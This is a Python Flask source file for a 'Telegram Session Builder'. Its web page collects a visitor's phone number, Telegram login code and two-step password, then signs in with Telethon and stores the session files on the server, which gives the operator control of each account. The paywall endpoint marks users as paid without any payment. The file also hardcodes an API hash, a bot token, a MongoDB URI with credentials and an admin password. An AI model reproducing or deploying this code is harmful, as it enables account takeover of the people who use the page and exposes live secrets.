# ================================================================
# Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP + PAYWALL)
# By: Tiam
# Device: ⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙
# ================================================================

import os
import asyncio
import threading
import secrets
import time
import shutil
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
import requests

# ===================== CONFIG ===================================
self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis",
    "device_name": "⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙"
}
os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================
mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)
db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links
payments_col = db.payments  # ذخیره وضعیت پرداخت

# ===================== Flask ====================================
app = Flask(__name__, static_url_path="/static", static_folder="static")

# ===================== Async Loop ================================
loop = asyncio.new_event_loop()
threading.Thread(
    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
    daemon=True
).start()

def run_async(coro):
    """اجرای همزمان کوروت‌ها"""
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================
def gen_token():
    """تولید توکن تصادفی برای لینک‌ها"""
    return secrets.token_urlsafe(8)

def consume_link(token: str) -> bool:
    """مصرف لینک با محدودیت تعداد استفاده"""
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def normalize_phone(phone: str) -> str:
    """تبدیل شماره تلفن به فرمت بین‌المللی"""
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def delete_session(phone: str):
    """حذف سشن و فایل‌های ذخیره شده"""
    path = os.path.join(self_config["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

def has_paid(phone: str) -> bool:
    """بررسی اینکه کاربر بخش پولی را فعال کرده یا نه"""
    return payments_col.find_one({"phone": phone, "paid": True}) is not None

# ===================== HTML User Panel ===========================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Telegram Session Builder</title>
<meta name="description" content="ساخت سریع سشن تلگرام با دستگاه ⦁ Self Nix و مدیریت امن">
<meta name="keywords" content="Telegram, Self Nix, Session Builder, Paywall, Tiam">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { background:#111; color:white; font-family:tahoma; direction:rtl; }
.box { width:360px; margin:80px auto; padding:25px; background:rgba(15,23,42,0.88); border-radius:16px; text-align:center; }
input, button { width:100%; padding:14px; margin-top:10px; border-radius:12px; border:none; font-size:15px; box-sizing:border-box; }
input.phone { direction:ltr; font-size:16px; }
button { background:#6366f1; color:white; cursor:pointer; transition:0.2s; }
button.active { background:#4ade80; }
#s2, #s3, #done, #paywall { display:none; }
p.note { font-size:12px; color:#ccc; margin-bottom:10px; }
</style>
</head>
<body>
<div class="box">
<h3>ساخت سشن تلگرام</h3>
<p class="note">شماره تلفن را با +98 یا کد کشور وارد کنید</p>
<input id="phone" class="phone" type="tel" pattern="[+0-9]{10,15}" placeholder="+98xxxxxxxxxx">
<button id="mainBtn" onclick="checkPhone()">دریافت کد</button>
<div id="s2">
<input id="code" placeholder="کد تلگرام">
<button onclick="sendCode()">تأیید کد</button>
</div>
<div id="s3">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
<button onclick="sendPassword()">تأیید رمز</button>
</div>
<div id="done"><h3>✅ سشن ساخته شد</h3></div>
<div id="paywall">
<h3>💰 بخش پولی</h3>
<p>برای دسترسی کامل به Self Telegram، لطفاً پرداخت را انجام دهید</p>
<button onclick="payNow()">پرداخت و فعال‌سازی</button>
</div>
</div>
<script>
let phone = "";
function checkPhone(){
    phone = document.getElementById("phone").value;
    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(r=>r.json()).then(d=>{
        if(d.status==="exists"){ let btn = document.getElementById("mainBtn"); btn.innerText="حذف سشن قبلی"; btn.onclick=deleteSession; }
        else sendPhone();
    });
}
function deleteSession(){
    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})}).then(()=>{
        alert("سشن قبلی حذف شد"); let btn=document.getElementById("mainBtn"); btn.innerText="دریافت کد"; btn.onclick=checkPhone;
    });
}
function sendPhone(){
    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})}).then(()=>{document.getElementById("s2").style.display="block";});
}
function sendCode(){
    let btn=document.querySelector("#s2 button"); btn.classList.add("active"); setTimeout(()=>btn.classList.remove("active"),400);
    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:document.getElementById("code").value})})
    .then(r=>r.json()).then(d=>{
        if(d.status==="2fa"){ document.getElementById("s2").style.display="none"; document.getElementById("s3").style.display="block"; }
        if(d.status==="ok") finish();
        if(d.status==="error") alert("کد اشتباه است");
    });
}
function sendPassword(){
    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:document.getElementById("password").value})}).then(()=>finish());
}
function finish(){
    document.getElementById("s2").style.display="none"; document.getElementById("s3").style.display="none"; document.getElementById("mainBtn").style.display="none";
    document.getElementById("done").style.display="block"; 
    fetch("/check_payment",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(r=>r.json()).then(d=>{if(!d.paid){document.getElementById("paywall").style.display="block";}});
}
function payNow(){
    fetch("/pay",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(r=>r.json()).then(d=>{if(d.status==="ok"){alert("پرداخت موفق، بخش پولی فعال شد"); document.getElementById("paywall").style.display="none";}});
}
setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== Admin HTML ==============================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>پنل مدیریت</title>
<style>
body { font-family:tahoma; background:#111; color:white; }
table { width:80%; margin:20px auto; border-collapse: collapse; }
th, td { border:1px solid #666; padding:8px; text-align:center; }
form { text-align:center; margin-top:20px; }
input { padding:8px; }
button { padding:8px 12px; }
</style>
</head>
<body>
<h2 style="text-align:center;">پنل مدیریت Telegram Session Builder</h2>
<form method="post">
    تعداد استفاده برای لینک جدید: <input type="number" name="max" value="1" min="1">
    <button type="submit">ساخت لینک جدید</button>
</form>
<h3 style="text-align:center;">لینک‌های موجود</h3>
<table>
<tr><th>توکن</th><th>استفاده شده</th><th>حداکثر</th><th>عملیات</th></tr>
{% for link in links %}
<tr>
<td>{{ link.token }}</td>
<td>{{ link.used }}</td>
<td>{{ link.max }}</td>
<td><button onclick="deleteLink('{{ link.token }}')">حذف</button></td>
</tr>
{% endfor %}
</table>
<script>
function deleteLink(token){
    fetch("/admin/delete_link",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token})}).then(()=> location.reload());
}
</script>
</body>
</html>
"""

# ===================== Routes ===================================
@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک منقضی یا نامعتبر"
    return render_template_string(HTML_PAGE)

@app.route("/bot")
def bot_entry():
    return redirect("/")

@app.route("/ping")
def ping():
    return "OK"

@app.route("/check_phone", methods=["POST"])
def check_phone():
    phone = normalize_phone(request.json["phone"])
    return jsonify(status="exists" if sessions_col.find_one({"phone": phone}) else "ok")

@app.route("/delete_session", methods=["POST"])
def delete_session_route():
    delete_session(normalize_phone(request.json["phone"]))
    return jsonify(status="ok")

@app.route("/check_payment", methods=["POST"])
def check_payment():
    phone = normalize_phone(request.json["phone"])
    return jsonify(paid=has_paid(phone))

@app.route("/pay", methods=["POST"])
def pay():
    phone = normalize_phone(request.json["phone"])
    payments_col.update_one({"phone": phone}, {"$set": {"paid": True}}, upsert=True)
    return jsonify(status="ok")

# ===================== Telethon ================================
clients = {}

async def create_client(phone):
    client = TelegramClient(
        os.path.join(self_config["save_path"], phone),
        self_config["api_id"],
        self_config["api_hash"],
        device_model=self_config["device_name"]
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    try:
        run_async(clients[phone].sign_in(phone, request.json["code"]))
        sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = normalize_phone(request.json["phone"])
    run_async(clients[phone].sign_in(password=request.json["password"]))
    sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
    return jsonify(status="ok")

# ===================== Admin Panel ===============================
@app.route("/admin", methods=["GET","POST"])
def admin():
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
    if request.method=="POST":
        links_col.insert_one({
            "token": gen_token(),
            "max": int(request.form["max"]),
            "used": 0,
            "created": datetime.utcnow()
        })
        return redirect("/admin")
    links = list(links_col.find())
    return render_template_string(ADMIN_HTML, links=links, self_config=self_config)

@app.route("/admin/delete_link", methods=["POST"])
def admin_delete_link():
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
    token = request.json.get("token")
    if token:
        links_col.delete_one({"token": token})
    return jsonify(status="ok")

# ===================== KEEP ALIVE ================================
def keep_alive():
    while True:
        try:
            requests.get(self_config["base_url"] + "/ping", timeout=10)
        except:
            pass
        time.sleep(240)

threading.Thread(target=keep_alive, daemon=True).start()

# ===================== RUN ======================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
